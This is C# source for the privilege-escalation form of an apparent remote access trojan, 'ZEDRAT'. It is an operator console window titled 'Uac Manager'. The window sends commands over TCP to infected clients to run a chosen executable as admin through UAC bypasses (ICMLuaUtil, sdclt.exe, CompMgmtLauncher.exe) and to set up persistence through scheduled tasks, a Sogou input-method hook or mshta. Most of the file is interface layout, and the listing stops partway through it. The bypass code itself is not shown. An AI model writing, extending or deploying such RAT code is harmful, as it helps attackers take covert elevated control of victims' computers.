using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Bunifu.UI.WinForms;
using Bunifu.UI.WinForms.BunifuButton;
using Guna.UI2.WinForms;


using Sockets;
using ZEDRAT.Algorithm;
using ZEDRAT.Messages;
using ZEDRAT.TCP;
using ZEDRatApp.Properties;
using Button = System.Windows.Forms.Button;

namespace ZEDRatApp.Forms
{
	public class Privilege_Escalation : Form
	{
		private IContainer components;

		private TcpClientSession _tcs;

		private bool Privileging;

		private object ProvilegeObj = new object();

		private Panel panel1;

		private GroupBox groupBox1;

		private Label label1;

		private TextBox textBox1;

		private RadioButton radioButton3;

		private RadioButton radioButton2;

		private RadioButton radioButton1;

		private Button button1;

		private TextBox textBox2;

		private Label label2;

		private RadioButton radioButton4;

		private GroupBox groupBox2;

		private RadioButton radioButton5;

		private RadioButton radioButton7;

		private RadioButton radioButton6;

		private Button button2;

		private RadioButton radioButton8;

		private Guna2Elipse Guna2Elipse1;

		private Guna2RadioButton ICMLuaUtilRadioButton;

		private Guna2HtmlLabel Guna2HtmlLabel8;

		private Guna2HtmlLabel Guna2HtmlLabel7;

		private Guna2HtmlLabel Guna2HtmlLabel6;

		private Guna2HtmlLabel Guna2HtmlLabel5;

		private Guna2HtmlLabel Guna2HtmlLabel4;

		private Guna2HtmlLabel Guna2HtmlLabel3;

		private Guna2HtmlLabel Guna2HtmlLabel;

		private Guna2HtmlLabel Guna2HtmlLabel1;

		private Guna2TextBox txtParam;

		private Guna2Button btnBuild;

		private Guna2HtmlLabel Guna2HtmlLabel9;

		private Guna2TextBox txtExePath;

		private Guna2HtmlLabel Guna2HtmlLabel12;

		private Guna2GroupBox Guna2GroupBox1;

		private Guna2GroupBox Guna2GroupBox2;

		private Guna2RadioButton systempermRadioButton;

		private Guna2RadioButton sdctlRadioButton;

		private Guna2RadioButton compmgmtRadioButton;

		private Guna2RadioButton mshtaRadioButton;

		private Guna2RadioButton TaskPlanningRadioButton;

		private Guna2RadioButton SoguRadioButton;

		private Guna2RadioButton SismluautilRadioButton;

		private Guna2Button Guna2Button1;

		private Guna2HtmlLabel Guna2HtmlLabel10;

		private Guna2Button btnRandom;

		private BunifuSeparator bunifuSeparator2;

		private Guna2ControlBox Guna2ControlBox1;

		private BunifuToolTip bunifuToolTip1;

		private BunifuIconButton CloseBtn;

		private Guna2ShadowForm guna2ShadowForm1;

		public Privilege_Escalation(string tital, TcpClientSession tcs)
		{
			this.InitializeComponent();
			this._tcs = tcs;
			this.Text = tital;
		}

		private void button1_Click(object sender, EventArgs e)
		{
			try
			{
				if (!this.Privileging)
				{
					lock (this.ProvilegeObj)
					{
						this.Privileging = true;
					}
					Remote_PrivilegeEscalation_Message remote_PrivilegeEscalation_Message = new Remote_PrivilegeEscalation_Message();
					remote_PrivilegeEscalation_Message.ExecPath = (this.txtExePath).Text;
					remote_PrivilegeEscalation_Message.parameter = (this.txtParam).Text;
					remote_PrivilegeEscalation_Message.MessageType = "Privilege";
					if (string.IsNullOrEmpty(remote_PrivilegeEscalation_Message.ExecPath))
					{
						throw new Exception();
					}
					if (this.sdctlRadioButton.Checked)
					{
						remote_PrivilegeEscalation_Message.PrivilegeType = "sdclt";
					}
					if (this.ICMLuaUtilRadioButton.Checked)
					{
						remote_PrivilegeEscalation_Message.PrivilegeType = "ICMLuaUtil";
					}
					if (this.systempermRadioButton.Checked)
					{
						remote_PrivilegeEscalation_Message.PrivilegeType = "system";
					}
					if (this.compmgmtRadioButton.Checked)
					{
						remote_PrivilegeEscalation_Message.PrivilegeType = "CompMgmtLauncher";
					}
					this._tcs.Client_Send(DataType.RemotePrivilegeType, Encoding.UTF8.GetBytes(Convert.ToBase64String(Serializable.Serialize(remote_PrivilegeEscalation_Message))));
				}
			}
			catch
			{
				lock (this.ProvilegeObj)
				{
					this.Privileging = false;
				}
			}
		}

		public void UpdataPrivilege_EscalationForm(TcpClientSession ts, byte[] bt)
		{
			try
			{
				lock (this.ProvilegeObj)
				{
					this.Privileging = false;
				}
				string status = Encoding.UTF8.GetString(bt);
				base.Invoke((MethodInvoker)delegate
				{
					if (status.Contains(".exe"))
					{
						(this.txtExePath).Text = status;
					}
					else
					{
						MessageBox.Show(status, "Status", MessageBoxButtons.OK);
					}
				});
			}
			catch
			{
				lock (this.ProvilegeObj)
				{
					this.Privileging = false;
				}
			}
		}

		private void Privilege_Escalation_Load(object sender, EventArgs e)
		{
			this._tcs?._Idispatchar?.Register(DataType.RemotePrivilegeType, new Action<TcpClientSession, byte[]>(UpdataPrivilege_EscalationForm));
		}

		private void Privilege_Escalation_FormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				this._tcs?._Idispatchar?.Unregister(DataType.RemotePrivilegeType);
			}
			catch
			{
			}
			finally
			{
				this._tcs = null;
			}
		}

		private void label1_Click(object sender, EventArgs e)
		{
			try
			{
				if (!this.Privileging)
				{
					lock (this.ProvilegeObj)
					{
						this.Privileging = true;
					}
					this._tcs.Client_Send(DataType.RemotePrivilegeType, Encoding.UTF8.GetBytes(Convert.ToBase64String(Serializable.Serialize(new Remote_PrivilegeEscalation_Message
					{
						MessageType = "Privilege",
						PrivilegeType = "path"
					}))));
				}
			}
			catch
			{
				lock (this.ProvilegeObj)
				{
					this.Privileging = false;
				}
			}
		}

		private void button2_Click(object sender, EventArgs e)
		{
			try
			{
				if (!this.Privileging)
				{
					lock (this.ProvilegeObj)
					{
						this.Privileging = true;
					}
					Remote_PrivilegeEscalation_Message remote_PrivilegeEscalation_Message = new Remote_PrivilegeEscalation_Message();
					remote_PrivilegeEscalation_Message.MessageType = "Persistent";
					if (this.SismluautilRadioButton.Checked)
					{
						remote_PrivilegeEscalation_Message.PrivilegeType = "ICMLuaUtil";
					}
					if (this.SoguRadioButton.Checked)
					{
						remote_PrivilegeEscalation_Message.PrivilegeType = "SG";
					}
					if (this.TaskPlanningRadioButton.Checked)
					{
						remote_PrivilegeEscalation_Message.PrivilegeType = "Task";
					}
					if (this.mshtaRadioButton.Checked)
					{
						throw new Exception("This interface is not implemented and will be updated in the future!");
					}
					this._tcs.Client_Send(DataType.RemotePrivilegeType, Encoding.UTF8.GetBytes(Convert.ToBase64String(Serializable.Serialize(remote_PrivilegeEscalation_Message))));
				}
			}
			catch (Exception ex)
			{
				lock (this.ProvilegeObj)
				{
					this.Privileging = false;
				}
				MessageBox.Show(ex.Message);
			}
		}

		private void siticoneGradientCircleButton1_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		[DllImport("user32.DLL")]
		private static extern void ReleaseCapture();

		[DllImport("user32.DLL")]
		private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

		private void BarraTitulo_MouseDown(object sender, MouseEventArgs e)
		{
			Privilege_Escalation.ReleaseCapture();
			Privilege_Escalation.SendMessage(base.Handle, 274, 61458, 0);
		}

		private void Privilege_Escalation_MouseDown(object sender, MouseEventArgs e)
		{
			Privilege_Escalation.ReleaseCapture();
			Privilege_Escalation.SendMessage(base.Handle, 274, 61458, 0);
		}

		private void btnRandom_Click(object sender, EventArgs e)
		{
			(this.txtExePath).Text = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
																																																																																																																																																																											this.components = new System.ComponentModel.Container();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(ZEDRatApp.Forms.Privilege_Escalation));
			this.Guna2Elipse1 = new Guna2Elipse(this.components);
			this.ICMLuaUtilRadioButton = new Guna2RadioButton();
			this.Guna2HtmlLabel1 = new Guna2HtmlLabel();
			this.Guna2HtmlLabel = new Guna2HtmlLabel();
			this.Guna2HtmlLabel3 = new Guna2HtmlLabel();
			this.Guna2HtmlLabel4 = new Guna2HtmlLabel();
			this.Guna2HtmlLabel5 = new Guna2HtmlLabel();
			this.Guna2HtmlLabel6 = new Guna2HtmlLabel();
			this.Guna2HtmlLabel7 = new Guna2HtmlLabel();
			this.Guna2HtmlLabel8 = new Guna2HtmlLabel();
			this.txtParam = new Guna2TextBox();
			this.btnBuild = new Guna2Button();
			this.Guna2HtmlLabel12 = new Guna2HtmlLabel();
			this.txtExePath = new Guna2TextBox();
			this.Guna2HtmlLabel9 = new Guna2HtmlLabel();
			this.Guna2GroupBox1 = new Guna2GroupBox();
			this.systempermRadioButton = new Guna2RadioButton();
			this.sdctlRadioButton = new Guna2RadioButton();
			this.compmgmtRadioButton = new Guna2RadioButton();
			this.Guna2GroupBox2 = new Guna2GroupBox();
			this.mshtaRadioButton = new Guna2RadioButton();
			this.TaskPlanningRadioButton = new Guna2RadioButton();
			this.SoguRadioButton = new Guna2RadioButton();
			this.SismluautilRadioButton = new Guna2RadioButton();
			this.Guna2Button1 = new Guna2Button();
			this.Guna2HtmlLabel10 = new Guna2HtmlLabel();
			this.btnRandom = new Guna2Button();
			this.bunifuSeparator2 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.Guna2ControlBox1 = new Guna2ControlBox();
			this.bunifuToolTip1 = new Bunifu.UI.WinForms.BunifuToolTip(this.components);
			this.CloseBtn = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(this.components);
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox1).SuspendLayout();
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox2).SuspendLayout();
			base.SuspendLayout();
			this.Guna2Elipse1.BorderRadius = 0;
			this.Guna2Elipse1.TargetControl = this;
			((System.Windows.Forms.Control)(object)this.ICMLuaUtilRadioButton).BackColor = System.Drawing.Color.Transparent;
			this.ICMLuaUtilRadioButton.CheckedState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.ICMLuaUtilRadioButton.CheckedState.BorderThickness = 0;
			this.ICMLuaUtilRadioButton.CheckedState.FillColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.ICMLuaUtilRadioButton.CheckedState.InnerColor = System.Drawing.Color.White;
			((System.Windows.Forms.Control)(object)this.ICMLuaUtilRadioButton).Location = new System.Drawing.Point(13, 50);
			((System.Windows.Forms.Control)(object)this.ICMLuaUtilRadioButton).Name = "ICMLuaUtilRadioButton";
			((System.Windows.Forms.Control)(object)this.ICMLuaUtilRadioButton).Size = new System.Drawing.Size(20, 20);
			((System.Windows.Forms.Control)(object)this.ICMLuaUtilRadioButton).TabIndex = 2;
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.ICMLuaUtilRadioButton, "");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.ICMLuaUtilRadioButton, null);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.ICMLuaUtilRadioButton, "");
			this.ICMLuaUtilRadioButton.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(125, 137, 149);
			this.ICMLuaUtilRadioButton.UncheckedState.BorderThickness = 2;
			this.ICMLuaUtilRadioButton.UncheckedState.FillColor = System.Drawing.Color.Transparent;
			this.ICMLuaUtilRadioButton.UncheckedState.InnerColor = System.Drawing.Color.Transparent;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1).BackColor = System.Drawing.Color.Transparent;
			this.Guna2HtmlLabel1.Font = new System.Drawing.Font("Century Gothic", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.Guna2HtmlLabel1.ForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1).Location = new System.Drawing.Point(39, 55);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1).Name = "Guna2HtmlLabel1";
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1).Size = new System.Drawing.Size(277, 18);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1).TabIndex = 10;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1).Text = "ICMLuaUtil interface (suitable for the whole system)";
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1, "");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1, null);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1, "");
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel).BackColor = System.Drawing.Color.Transparent;
			this.Guna2HtmlLabel.Font = new System.Drawing.Font("Century Gothic", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.Guna2HtmlLabel.ForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel).Location = new System.Drawing.Point(39, 87);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel).Name = "Guna2HtmlLabel";
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel).Size = new System.Drawing.Size(249, 18);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel).TabIndex = 11;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel).Text = "CompMgmtLauncher.exe (suitable for win7,8)";
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel, "");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel, null);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel, "");
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel3).BackColor = System.Drawing.Color.Transparent;
			this.Guna2HtmlLabel3.Font = new System.Drawing.Font("Century Gothic", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.Guna2HtmlLabel3.ForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel3).Location = new System.Drawing.Point(39, 60);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel3).Name = "Guna2HtmlLabel3";
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel3).Size = new System.Drawing.Size(277, 18);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel3).TabIndex = 12;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel3).Text = "ICMLuaUtil interface (suitable for the whole system)";
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel3, "");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel3, null);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel3, "");
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4).BackColor = System.Drawing.Color.Transparent;
			this.Guna2HtmlLabel4.Font = new System.Drawing.Font("Century Gothic", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.Guna2HtmlLabel4.ForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4).Location = new System.Drawing.Point(39, 89);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4).Name = "Guna2HtmlLabel4";
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4).Size = new System.Drawing.Size(329, 18);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4).TabIndex = 13;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4).Text = "Sogou input method interface (suitable for the whole system)";
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4, "");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4, null);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4, "");
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel5).BackColor = System.Drawing.Color.Transparent;
			this.Guna2HtmlLabel5.Font = new System.Drawing.Font("Century Gothic", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.Guna2HtmlLabel5.ForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel5).Location = new System.Drawing.Point(461, 55);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel5).Name = "Guna2HtmlLabel5";
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel5).Size = new System.Drawing.Size(154, 18);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel5).TabIndex = 14;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel5).Text = "sdclt.exe (suitable for win10)";
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel5, "");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel5, null);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel5, "");
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel6).BackColor = System.Drawing.Color.Transparent;
			this.Guna2HtmlLabel6.Font = new System.Drawing.Font("Century Gothic", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.Guna2HtmlLabel6.ForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel6).Location = new System.Drawing.Point(461, 87);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel6).Name = "Guna2HtmlLabel6";
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel6).Size = new System.Drawing.Size(372, 18);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel6).TabIndex = 15;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel6).Text = "System permissions (admin permissions are required, use with caution)";
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel6, "");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel6, null);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel6, "");
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel7).BackColor = System.Drawing.Color.Transparent;
			this.Guna2HtmlLabel7.Font = new System.Drawing.Font("Century Gothic", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.Guna2HtmlLabel7.ForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel7).Location = new System.Drawing.Point(461, 59);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel7).Name = "Guna2HtmlLabel7";
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel7).Size = new System.Drawing.Size(291, 18);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel7).TabIndex = 16;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel7).Text = "Task planning interface (suitable for the whole system)";
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel7, "");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel7, null);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel7, "");
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel8).BackColor = System.Drawing.Color.Transparent;
			this.Guna2HtmlLabel8.Font = new System.Drawing.Font("Century Gothic", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.Guna2HtmlLabel8.ForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel8).Location = new System.Drawing.Point(461, 90);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel8).Name = "Guna2HtmlLabel8";
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel8).Size = new System.Drawing.Size(274, 18);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel8).TabIndex = 17;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel8).Text = "mshta.exe interface (suitable for the whole system)";
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel8, "");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel8, null);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel8, "");
			(this.txtParam).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.txtParam).Cursor = System.Windows.Forms.Cursors.IBeam;
			(this.txtParam).DefaultText = "u";
			(this.txtParam).DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			(this.txtParam).DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			(this.txtParam).DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			(this.txtParam).DisabledState.Parent = this.txtParam;
			(this.txtParam).DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			(this.txtParam).FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			(this.txtParam).FocusedState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.txtParam).FocusedState.Parent = this.txtParam;
			((System.Windows.Forms.Control)(object)this.txtParam).Location = new System.Drawing.Point(560, 262);
			((System.Windows.Forms.Control)(object)this.txtParam).Name = "txtParam";
			(this.txtParam).PasswordChar = '\0';
			(this.txtParam).PlaceholderText = "";
			(this.txtParam).SelectedText = "";
			(this.txtParam).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.txtParam;
			((System.Windows.Forms.Control)(object)this.txtParam).Size = new System.Drawing.Size(155, 28);
			((System.Windows.Forms.Control)(object)this.txtParam).TabIndex = 24;
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.txtParam, "");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.txtParam, null);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.txtParam, "");
			(this.btnBuild).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.btnBuild).BorderThickness = 1;
			(this.btnBuild).CheckedState.Parent = this.btnBuild;
			(this.btnBuild).CustomBorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.btnBuild).CustomBorderThickness = new System.Windows.Forms.Padding(1, 0, 0, 0);
			(this.btnBuild).CustomImages.Parent = this.btnBuild;
			(this.btnBuild).FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			((System.Windows.Forms.Control)(object)this.btnBuild).Font = new System.Drawing.Font("Century Gothic", 9f);
			((System.Windows.Forms.Control)(object)this.btnBuild).ForeColor = System.Drawing.Color.White;
			((System.Windows.Forms.Control)(object)this.btnBuild).Location = new System.Drawing.Point(721, 245);
			((System.Windows.Forms.Control)(object)this.btnBuild).Name = "btnBuild";
			(this.btnBuild).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.btnBuild;
			((System.Windows.Forms.Control)(object)this.btnBuild).Size = new System.Drawing.Size(138, 28);
			((System.Windows.Forms.Control)(object)this.btnBuild).TabIndex = 25;
			((System.Windows.Forms.Control)(object)this.btnBuild).Text = "Carried Out";
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.btnBuild, "Execute Payload as admin");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.btnBuild, ZEDRatApp.Properties.Resources.privilege);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.btnBuild, "Hydra");
			((System.Windows.Forms.Control)(object)this.btnBuild).Click += new System.EventHandler(button1_Click);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).Anchor = System.Windows.Forms.AnchorStyles.Top;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).BackColor = System.Drawing.Color.Transparent;
			this.Guna2HtmlLabel12.Font = new System.Drawing.Font("Century Gothic", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.Guna2HtmlLabel12.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).Location = new System.Drawing.Point(366, 21);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).Name = "Guna2HtmlLabel12";
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).Size = new System.Drawing.Size(112, 23);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).TabIndex = 36;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).Text = "Uac Manager";
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12, "");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12, null);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12, "");
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).MouseDown += new System.Windows.Forms.MouseEventHandler(BarraTitulo_MouseDown);
			(this.txtExePath).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.txtExePath).Cursor = System.Windows.Forms.Cursors.IBeam;
			(this.txtExePath).DefaultText = "Remote /path/exe";
			(this.txtExePath).DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			(this.txtExePath).DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			(this.txtExePath).DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			(this.txtExePath).DisabledState.Parent = this.txtExePath;
			(this.txtExePath).DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			(this.txtExePath).FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			(this.txtExePath).FocusedState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.txtExePath).Location = new System.Drawing.Point(125, 262);
			((System.Windows.Forms.Control)(object)this.txtExePath).Name = "txtExePath";
			(this.txtExePath).PasswordChar = '\0';
			(this.txtExePath).PlaceholderText = "";
			(this.txtExePath).SelectedText = "";
			(this.txtExePath).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.txtExePath;
			((System.Windows.Forms.Control)(object)this.txtExePath).Size = new System.Drawing.Size(313, 28);
			((System.Windows.Forms.Control)(object)this.txtExePath).TabIndex = 38;
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.txtExePath, "");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.txtExePath, null);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.txtExePath, "");
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel9).BackColor = System.Drawing.Color.Transparent;
			this.Guna2HtmlLabel9.Font = new System.Drawing.Font("Century Gothic", 9f);
			this.Guna2HtmlLabel9.ForeColor = System.Drawing.Color.White;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel9).Location = new System.Drawing.Point(23, 267);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel9).Name = "Guna2HtmlLabel9";
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel9).Size = new System.Drawing.Size(94, 19);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel9).TabIndex = 39;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel9).Text = "Execution Path:";
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel9, "");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel9, null);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel9, "");
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel9).Click += new System.EventHandler(label1_Click);
			this.Guna2GroupBox1.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox1).Controls.Add((System.Windows.Forms.Control)(object)this.systempermRadioButton);
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox1).Controls.Add((System.Windows.Forms.Control)(object)this.sdctlRadioButton);
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox1).Controls.Add((System.Windows.Forms.Control)(object)this.compmgmtRadioButton);
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox1).Controls.Add((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel5);
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox1).Controls.Add((System.Windows.Forms.Control)(object)this.ICMLuaUtilRadioButton);
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox1).Controls.Add((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel1);
